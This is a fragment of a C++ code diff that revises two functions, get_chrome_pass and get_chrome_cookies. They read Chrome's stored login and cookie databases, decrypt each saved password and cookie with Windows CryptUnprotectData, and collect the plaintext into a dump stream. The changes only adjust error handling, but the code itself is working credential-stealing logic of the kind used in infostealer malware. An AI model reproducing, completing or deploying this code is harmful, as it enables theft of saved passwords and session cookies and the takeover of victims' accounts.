@@ -31,19 +31,20 @@ stringstream get_chrome_pass(sqlite3* db)
         memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);
 
         CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
-        if(decryptedPass.pbData==nullptr)
+        if(decryptedPass.pbData==nullptr || decryptedPass.cbData<1)
         {
             cerr<<"get_chrome_pass() error"<<endl;
             return dump;
         }
-
-        i=0;
-        while(decryptedPass.pbData[i])
+        else
         {
-            dump<<decryptedPass.pbData[i];
-            i++;
+            i=0;
+            while(decryptedPass.pbData[i])
+            {
+                dump<<decryptedPass.pbData[i];
+                i++;
+            }
         }
-
         dump<<endl;
         free(encryptedPass.pbData);
         rc=sqlite3_step(pStmt);
@@ -82,19 +83,20 @@ stringstream get_chrome_cookies(sqlite3* db)
         memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedCookies.cbData);
 
         CryptUnprotectData(&encryptedCookies, NULL, NULL, NULL, NULL, 0, &decryptedCookies);
-        if(decryptedCookies.pbData==nullptr)
+        if(decryptedCookies.pbData==nullptr || encryptedCookies.cbData<1)
         {
             cerr<<"get_chrome_cookies() error"<<endl;
-            return dump;
+            //return dump;
         }
-
-        i=0;
-        while(decryptedCookies.pbData[i])
+        else
         {
-            dump<<decryptedCookies.pbData[i];
-            i++;
+            i=0;
+            while(decryptedCookies.pbData[i])
+            {
+                dump<<decryptedCookies.pbData[i];
+                i++;
+            }
         }
-
         dump<<endl;
         free(encryptedCookies.pbData);
         rc=sqlite3_step(pStmt);
